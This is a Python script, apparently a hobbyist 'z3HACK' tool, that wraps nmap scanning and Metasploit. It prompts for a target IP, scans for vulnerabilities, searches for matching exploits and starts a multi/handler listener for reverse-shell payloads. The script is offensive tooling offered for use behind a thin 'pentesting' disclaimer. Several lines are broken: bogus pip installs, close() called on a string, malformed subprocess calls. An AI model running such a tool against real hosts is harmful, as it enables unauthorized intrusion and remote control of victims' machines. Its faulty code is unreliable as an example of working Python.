#!/usr/bin/env python3
# pip3 install subprocess
# pip3 install sleep
import os
import subprocess
from time import sleep

print('''

Welcome to z3HACK tool for AutoHACK This tool Made By z3morov SEC ( z3eem56 )

IG: https://www.instagram.com/z3morovsec/
TW: https://twitter.com/z3morovsec
YT: https://www.youtube.com/channel/UCVhaYMty-wDQsbeJhCf_D5Q

''')
sleep(2)

Kl = input('''________________________________________________________________
|                         !!! ATTENTION !!!                    |
|--------------------------------------------------------------|
|                    This Tool for Pentesting                  |
|                if you use this to do a Illegal acts          |
|                                                              |
|                             You will be                      |
|                                                              |
|                        (((!!! tracked !!!)))                 |
|                                                              |
|______________________________________________________________|

continue??[Y/n]: ''')

if Kl == 'n':
    Kl.close()

if Kl == 'Y':

    ur = input('''
    chose your attack Option

    [ + ] 1 Create Listener and run it to do a social Engineer/WebApp Attack (you need to create PAYLOAD first uses msfvenom command)
    [ + ] 2 Search A Vuln and Auto Exploit 

    what Your Chose ? : ''')

    if ur == '1':
        lhost = input(" [*]enter lhost : ")
        lport = input(" [*]enter lport : ")
        payload = input(" [*]enter payload : ")
        startmsf = "use exploit/multi/handler;set PAYLOAD " + payload + ";set LHOST " + lhost + ";set LPORT " + lport + ";exploit"
        subprocess.call(["msfconsole", "-q", "-x", startmsf])

    if ur == '2':
        host = input(" [*]Enter lhost >: ")
        port = input(" [*]Enter lport >: ")
        host1 = input(''' 
        [*]Enter the IP Target : ''')
        port1 = input(" [*]Enter Port (if you don't Know Skip)>: ")
        payload1 = input(" [*]Enter the Payload (if you don't need it just skip) >: ")
        lk = input('''
        [ 1 ] Press 1 to Active Scan ( normal scan )
        [ 2 ] Press 2 to Active Scan ( Deep Scan With Vuln name )
        [ 3 ] Press 3 to Passive Scan ( with anonymously but without good result )
        z3HACK~#/>: ''')
        if lk == '1':
            nmap1 = "nmap -sV "+host1+""
            subprocess.call(["nmap", host1, nmap1])
            sleep(2)
            vuln = input('''

                        Chose the Vuln You Want to exploit from Service menu (write as small like: vsftpd,openssh,etc...)  

                        z3HACK~#/>: ''')

            print('''

            Now The Mission it in your hand, Good Hunting and goodbye <;

                        ''')

            startmsf1 = "search " + vuln + ""
            subprocess.call(["msfconsole", "-q", "-x", startmsf1])
            chose = "use " + vuln + ";set PAYLOAD " + payload1 + ";set lhost " + host + ";set lport " + port + ";set rhost " + host1 + ";set rport " + port1 + ""
            subprocess.call([chose])
        if lk == '2':
            os.system("nmap -sV -vv --script=vuln "+host1+"")
            sleep(2)
            vuln = input('''

                        Chose the Vuln You Want to exploit from VULN menu (write as like: vsftpd,openssh,etc...)  

                        z3HACK~#/>: ''')

            print('''

            Now The Mission it in your hand, Good Hunting and goodbye <;

                                    ''')

            startmsf1 = "search " + vuln + ""
            subprocess.call(["msfconsole", "-q", "-x", startmsf1])
            chose = "use " + vuln + ";set PAYLOAD " + payload1 + ";set lhost " + host + ";set lport " + port + ";set rhost " + host1 + ";set rport " + port1 + ""
            subprocess.call([chose])
        if lk == '3':
            nmap1 = "nmap -sS -vv "+host1+""
            subprocess.call(["nmap", host1, nmap1])
            vuln = input('''

                        Chose and search the Vuln You Want to exploit from the menu (write as like: vsftpd,openssh,etc...)  

                        z3HACK~#/>: ''')

            print('''

            Now The Mission it in your hand, Good Hunting and goodbye <;

                                                ''')

            startmsf1 = "search " + vuln + ""
            subprocess.call(["msfconsole", "-q", "-x", startmsf1])
            chose = "use " + vuln + ";set PAYLOAD " + payload1 + ";set lhost " + host + ";set lport " + port + ";set rhost " + host1 + ";set rport " + port1 + ""
            subprocess.call([chose])
